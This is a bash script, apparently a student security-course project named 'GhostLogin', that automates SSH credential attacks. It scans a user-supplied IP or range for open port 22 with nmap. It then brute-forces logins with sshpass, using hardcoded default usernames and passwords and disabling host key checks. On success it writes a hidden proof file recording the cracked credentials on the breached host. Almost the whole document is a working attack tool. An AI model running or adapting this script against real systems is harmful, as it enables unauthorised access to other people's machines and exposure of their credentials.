#!/bin/bash

# Project: GhostLogin
# Student Code: s18
# Student Name: Shalev Revach
# Unit: PERES25B
# Lecturer Name: Zach Azualis


BLUE='\033[1;34m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'


LOG_FILE="shalev_audit.log"
PROOF_FILE=".shalev_proof"
TEMP_FILE="targets_list.txt"

timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

clear

echo -e "${BLUE}=================================================${NC}"
echo -e "${BLUE} GhostLogin - Automated SSH Exposoure and Attack ${NC}"
echo -e "${BLUE}=================================================${NC}"
echo ""

# PHASE 1: Target Acquisition
echo -e "${BLUE}[ PHASE 1: Network Targeting ]${NC}"
echo -e "${BLUE}------------------------------${NC}"

echo -n "Enter Target IP / Range: "
read target_ip

if [ -z "$target_ip" ]; then
    echo -e "${RED}[ERROR] Target IP is required.${NC}"
    exit 1
fi

echo "[INFO] [$(timestamp)] Target acquired: $target_ip" > $LOG_FILE
echo -e "[$(timestamp)] Target locked: $target_ip"
echo ""

# PHASE 2: Vulnerability Scan
echo -e "${BLUE}[ PHASE 2: Vulnerability Scan ]${NC}"
echo -e "${BLUE}-------------------------------${NC}"
echo -e "[$(timestamp)] Scanning for Port 22..."

# Log the start of the scan to the audit file
echo "[INFO] [$(timestamp)] Scanning for open SSH ports..." >> $LOG_FILE

nmap -p 22 "$target_ip" -oG - | grep "/open" | awk '{print $2}' > $TEMP_FILE

if [ ! -s $TEMP_FILE ]; then
    echo -e "${RED}[FAIL] Target is not vulnerable (Port 22 closed).${NC}"
    rm $TEMP_FILE 2>/dev/null
    exit 1
fi

echo "[INFO] [$(timestamp)] Vulnerable service found: SSH (Port 22)" >> $LOG_FILE
echo -e "${GREEN}[OK] SSH service confirmed.${NC}"
echo ""

# PHASE 3: Configuration
echo -e "${BLUE}[ PHASE 3: Payload Configuration ]${NC}"
echo -e "${BLUE}----------------------------------${NC}"

# Define credential dictionaries for the attack
USERS=("admin" "shalev" "root" "kali" "user" "guest")
PASSWORDS=("123456" "1234" "password" "toor" "admin" "kali")

# Initialize verbose logging
echo "========================================" >> $LOG_FILE
echo "Network Intrusion Log - Verbose Mode" >> $LOG_FILE
echo "========================================" >> $LOG_FILE

echo -e "[$(timestamp)] Loading exploit modules..."
echo -e "[$(timestamp)] Preparing brute-force dictionaries..."
echo -e "[$(timestamp)] Log initialized: $LOG_FILE"
echo ""

# PHASE 4: Execution
echo -e "${BLUE}[ PHASE 4: Execution ]${NC}"
echo -e "${BLUE}----------------------${NC}"
echo -e "[$(timestamp)] Engaging target..."

success_flag=0

# Iterate through each valid target and attempt login
for target in $(cat $TEMP_FILE); do

    echo "[INFO] [$(timestamp)] Attacking Host: $target" >> $LOG_FILE
# Nested loops to try every user/password combination
    for user in "${USERS[@]}"; do

        for pass in "${PASSWORDS[@]}"; do

            echo "[TEST] [$(timestamp)] Verifying credentials on $target..." >> $LOG_FILE

            PAYLOAD="echo -e \"
	[ GHOSTLOGIN ] SYSTEM REPORT
	--------------------------------------------
	Target IP    : $target
	Hostname     : \$(hostname)
	--------------------------------------------
	[!] Confirmed Login Information [!]
	USERNAME     : $user
	PASSWORD     : $pass
	--------------------------------------------
	Access Date  : \$(date)
	Performed By : Shalev
	\" > $PROOF_FILE"

	# Attempt SSH connection using sshpass
            sshpass -p "$pass" ssh -n -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$target" "$PAYLOAD" 2>/dev/null

            if [ $? -eq 0 ]; then

                echo -e "[$(timestamp)] ${GREEN}[SUCCESS] Access Granted!${NC}"
                echo -e "[$(timestamp)] Credentials matched -> $user:$pass"

                echo "[PWNED] [$(timestamp)] *** SYSTEM BREACHED *** | IP: $target | Creds: $user:$pass" >> $LOG_FILE
                success_flag=1

                break 2
            else
                echo "[FAIL] [$(timestamp)] Authentication failed. Access denied." >> $LOG_FILE
                sleep 0.5
            fi
        done
    done
done
echo ""

# PHASE 5: Reporting
echo -e "${BLUE}[ PHASE 5: Report ]${NC}"
echo -e "${BLUE}-------------------${NC}"

if [ $success_flag -eq 1 ]; then
    echo -e "[$(timestamp)] Payload delivered: Created hidden file '$PROOF_FILE'."
    echo "[INFO] [$(timestamp)] Persistence file '$PROOF_FILE' planted." >> $LOG_FILE
    echo -e "${GREEN}Mission Successful.${NC}"
else
    echo -e "${RED}Mission Failed.${NC}"
    echo "[FAIL] [$(timestamp)] Attack Failed." >> $LOG_FILE
fi

# Cleanup temporary files
rm $TEMP_FILE 2>/dev/null
echo -e "[$(timestamp)] Details saved to $LOG_FILE"
